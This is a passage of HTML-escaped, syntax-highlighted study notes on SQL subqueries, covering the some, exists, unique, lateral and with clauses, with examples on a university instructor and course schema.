&lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;Comp. Sci.&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;some-at-least-one-clause&#34; &gt;Some (at least one) Clause
&lt;span&gt;
    &lt;a href=&#34;#some-at-least-one-clause&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;some&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;Comp. Sci.&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;exists-clause&#34; &gt;Exists Clause
&lt;span&gt;
    &lt;a href=&#34;#exists-clause&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Can also use not exists&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;section&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;semester&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;Fall&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;2017&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;exists&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;section&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;semester&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;Spring&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;2018&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S.course_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T.course_id)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;test-non-empty-relations&#34; &gt;Test Non-Empty Relations
&lt;span&gt;
    &lt;a href=&#34;#test-non-empty-relations&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Triple query.&lt;/p&gt;
&lt;p&gt;Assert inner query is non-empty (not exists) where inner query does a search based on condition 1 which also asserts it satisfies condition 2 which could be another query.&lt;/p&gt;
&lt;p&gt;Find all students who have taken all courses offered in the Biology department.&lt;/p&gt;
&lt;p&gt;return student if for all biology courses available student has taken that course. → return students where the following relation is empty (all bio courses except the ones the student has taken)&lt;/p&gt;
&lt;h4 id=&#34;unique&#34; &gt;Unique
&lt;span&gt;
    &lt;a href=&#34;#unique&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Returns true if subquery contains no duplicates (one find). Add &lt;code&gt;not&lt;/code&gt; before  &lt;code&gt;unique&lt;/code&gt; for &amp;ldquo;at least twice&amp;rdquo;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;find all courses that were offered at most once in 2017&lt;/summary&gt;
&lt;p&gt;For all courses, find unique instances where the course was offered in 2017&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unique&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;R&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T.course_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;R.course_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;R.&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;2017&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;h4 id=&#34;correlated-subqueries&#34; &gt;Correlated Subqueries
&lt;span&gt;
    &lt;a href=&#34;#correlated-subqueries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;For each tuple obtained from the outer query, compute the
inner query. Need to use the &lt;code&gt;lateral&lt;/code&gt; prefix to do so.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S.dept_name)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_avg&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_avg&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T,&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;lateral&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_avg&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;              &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T.dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S.dept_name)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;with-clause&#34; &gt;With Clause
&lt;span&gt;
    &lt;a href=&#34;#with-clause&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;with temp_relation (list_of_attributes) as (subquery)&lt;/p&gt;
&lt;p&gt;Find all departments where the total salary is greater than the
average of the total salary at all departments&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;with&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_total&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;value)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;sum&lt;/span&gt;(salary)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;            &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;group&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name),&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;        &lt;/span&gt;dept_total_avg&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(value)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;avg&lt;/span&gt;(value)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_total)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_total,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_total_avg&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_total.value&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_total_avg.value&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;data-modifications&#34; &gt;Data Modifications
&lt;span&gt;
    &lt;a href=&#34;#data-modifications&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;alter&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;table&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;r&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;attribute&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;data_typ&lt;span style=&#34;color:#666&#34;&gt;
